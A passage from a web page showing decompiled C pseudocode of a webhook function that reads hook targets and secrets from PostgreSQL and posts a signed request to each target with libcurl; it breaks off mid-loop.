</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">perform_hooks</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">conn</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">qs</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">kind</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">FILE</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// x19
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// x20
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v7</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v8</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v9</span><span class="p">;</span> <span class="c1">// x19
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">v10</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_QWORD</span> <span class="o">*</span><span class="n">v11</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// w0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// x0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v15</span><span class="p">[</span><span class="mi">29</span><span class="p">];</span> <span class="c1">// [xsp+0h] [xbp+0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">kind_</span><span class="p">;</span> <span class="c1">// [xsp+E8h] [xbp+E8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">qs_</span><span class="p">;</span> <span class="c1">// [xsp+F0h] [xbp+F0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">conn_</span><span class="p">;</span> <span class="c1">// [xsp+F8h] [xbp+F8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// [xsp+108h] [xbp+108h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">qs__</span><span class="p">;</span> <span class="c1">// [xsp+110h] [xbp+110h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// [xsp+118h] [xbp+118h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">qs_len</span><span class="p">;</span> <span class="c1">// [xsp+120h] [xbp+120h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [xsp+128h] [xbp+128h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v24</span><span class="p">;</span> <span class="c1">// [xsp+130h] [xbp+130h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v25</span><span class="p">;</span> <span class="c1">// [xsp+134h] [xbp+134h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v26</span><span class="p">;</span> <span class="c1">// [xsp+138h] [xbp+138h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v27</span><span class="p">;</span> <span class="c1">// [xsp+13Ch] [xbp+13Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">headers</span><span class="p">;</span> <span class="c1">// [xsp+140h] [xbp+140h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v29</span><span class="p">;</span> <span class="c1">// [xsp+148h] [xbp+148h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v30</span><span class="p">;</span> <span class="c1">// [xsp+150h] [xbp+150h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v31</span><span class="p">;</span> <span class="c1">// [xsp+158h] [xbp+158h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v32</span><span class="p">;</span> <span class="c1">// [xsp+15Ch] [xbp+15Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v33</span><span class="p">;</span> <span class="c1">// [xsp+160h] [xbp+160h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v34</span><span class="p">;</span> <span class="c1">// [xsp+164h] [xbp+164h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v35</span><span class="p">;</span> <span class="c1">// [xsp+168h] [xbp+168h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v36</span><span class="p">;</span> <span class="c1">// [xsp+16Ch] [xbp+16Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v37</span><span class="p">;</span> <span class="c1">// [xsp+170h] [xbp+170h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v38</span><span class="p">;</span> <span class="c1">// [xsp+174h] [xbp+174h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v39</span><span class="p">;</span> <span class="c1">// [xsp+178h] [xbp+178h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="o">*</span><span class="n">resp_headers</span><span class="p">;</span> <span class="c1">// [xsp+180h] [xbp+180h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v41</span><span class="p">;</span> <span class="c1">// [xsp+188h] [xbp+188h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="o">*</span><span class="n">targets</span><span class="p">;</span> <span class="c1">// [xsp+190h] [xbp+190h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v43</span><span class="p">;</span> <span class="c1">// [xsp+198h] [xbp+198h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="o">*</span><span class="n">secrets</span><span class="p">;</span> <span class="c1">// [xsp+1A0h] [xbp+1A0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v45</span><span class="p">;</span> <span class="c1">// [xsp+1A8h] [xbp+1A8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">v46</span><span class="p">;</span> <span class="c1">// [xsp+1B0h] [xbp+1B0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">num_hooks</span><span class="p">;</span> <span class="c1">// [xsp+1B8h] [xbp+1B8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [xsp+1C0h] [xbp+1C0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [xsp+1C4h] [xbp+1C4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [xsp+1C8h] [xbp+1C8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">m</span><span class="p">;</span> <span class="c1">// [xsp+1CCh] [xbp+1CCh]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">conn_</span> <span class="o">=</span> <span class="n">conn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">qs_</span> <span class="o">=</span> <span class="n">qs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">kind_</span> <span class="o">=</span> <span class="n">kind</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">qs__</span> <span class="o">=</span> <span class="n">qs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v21</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">qs_len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">qs</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">num_hooks</span> <span class="o">=</span> <span class="mi">5LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v46</span> <span class="o">=</span> <span class="nf">PQexecParams</span><span class="p">(</span><span class="n">conn_</span><span class="p">,</span> <span class="s">&#34;SELECT count(kind) FROM hooks WHERE kind = $1&#34;</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kind_</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">PQresultStatus</span><span class="p">(</span><span class="n">v46</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">LABEL_2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span> <span class="o">=</span> <span class="nf">PQgetvalue</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">num_hooks</span> <span class="o">=</span> <span class="nf">byteswap64</span><span class="p">(</span><span class="o">*</span><span class="n">v7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">PQclear</span><span class="p">(</span><span class="n">v46</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">num_hooks</span> <span class="o">&gt;</span> <span class="mh">0xA</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;too many hooks (%zu) for kind %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">num_hooks</span><span class="p">,</span> <span class="n">kind_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">num_hooks</span> <span class="o">=</span> <span class="mi">10LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">v46</span> <span class="o">=</span> <span class="nf">PQexecParams</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="n">conn_</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="s">&#34;SELECT target, secret FROM hooks WHERE kind = $1 ORDER BY target LIMIT 10&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">1LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">0LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="o">&amp;</span><span class="n">kind_</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">0LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">0LL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="mi">1LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">PQresultStatus</span><span class="p">(</span><span class="n">v46</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v45</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&gt;&gt;</span> <span class="mi">58</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">25</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&gt;&gt;</span> <span class="mi">58</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">secrets</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v43</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">targets</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v41</span> <span class="o">=</span> <span class="n">num_hooks</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="n">num_hooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v15</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">resp_headers</span> <span class="o">=</span> <span class="n">v15</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v13</span> <span class="o">=</span> <span class="nf">PQntuples</span><span class="p">(</span><span class="n">v46</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="n">v13</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">n</span> <span class="o">=</span> <span class="nf">PQgetlength</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v8</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v9</span> <span class="o">=</span> <span class="n">targets</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">=</span> <span class="nf">PQgetvalue</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">memcpy</span><span class="p">(</span><span class="n">v9</span><span class="p">,</span> <span class="n">v10</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v11</span> <span class="o">=</span> <span class="nf">PQgetvalue</span><span class="p">(</span><span class="n">v46</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">v12</span> <span class="o">=</span> <span class="nf">byteswap64</span><span class="p">(</span><span class="o">*</span><span class="n">v11</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">secrets</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v12</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">v14</span> <span class="o">=</span> <span class="nf">PQclear</span><span class="p">(</span><span class="n">v46</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="nf">curl_easy_init</span><span class="p">(</span><span class="n">v14</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v39</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v38</span> <span class="o">=</span> <span class="mi">20012</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">20012LL</span><span class="p">,</span> <span class="n">upload_bytes_function</span><span class="p">);</span><span class="c1">// CURLOPT_READFUNCTION
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">v37</span> <span class="o">=</span> <span class="mi">10009</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">10009LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">qs__</span><span class="p">);</span>    <span class="c1">// CURLOPT_READDATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">v36</span> <span class="o">=</span> <span class="mi">47</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">47LL</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>         <span class="c1">// CURLOPT_POST
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">v35</span> <span class="o">=</span> <span class="mi">10015</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">10015LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>      <span class="c1">// CURLOPT_POSTFIELDS
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">v34</span> <span class="o">=</span> <span class="mi">60</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">60LL</span><span class="p">,</span> <span class="n">qs_len</span><span class="p">);</span>      <span class="c1">// CURLOPT_POSTFIELDSIZE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">v33</span> <span class="o">=</span> <span class="mi">20011</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">20011LL</span><span class="p">,</span> <span class="n">ignore_response_function</span><span class="p">);</span><span class="c1">// CURLOPT_WRITEFUNCTION
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">v32</span> <span class="o">=</span> <span class="mi">10238</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">10238LL</span><span class="p">,</span> <span class="s">&#34;http&#34;</span><span class="p">);</span>   <span class="c1">// CURLOPT_DEFAULT_PROTOCOL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">v31</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">13LL</span><span class="p">,</span> <span class="mi">3LL</span><span class="p">);</span>         <span class="c1">// CURLOPT_TIMEOUT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">num_hooks</span> <span class="o">&gt;</span> <span class="n">j</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">v30</span> <span class="o">=</span> <span class="n">targets</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">v29</span> <span class="o">=</span> <span class="n">secrets</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span> <span class="o">=</span> <span class="nf">add_digest_header</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">qs_</span><span class="p">,</span> <span class="n">v29</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">headers</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="nf">__assert_fail</span><span class="p">(</span><span class="s">&#34;headers != NULL&#34;</span><span class="p">,</span> <span class="s">&#34;webhook.c&#34;</span><span class="p">,</span> <span class="mh">0xADu</span><span class="p">,</span> <span class="s">&#34;perform_hooks&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v27</span> <span class="o">=</span> <span class="mi">10002</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">curl_easy_setopt</span><span class="p">(</span><span class="n">v39</span><span class="p">,</span> <span class="mi">10002LL</span><span class="p">,</span> <span class="n">v30</span><span class="p">);</span>    <span class="c1">// CURLOPT_URL
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">v26</span> <span class="o">=</span> <span class="mi">10023</span><span class="p">;</span>
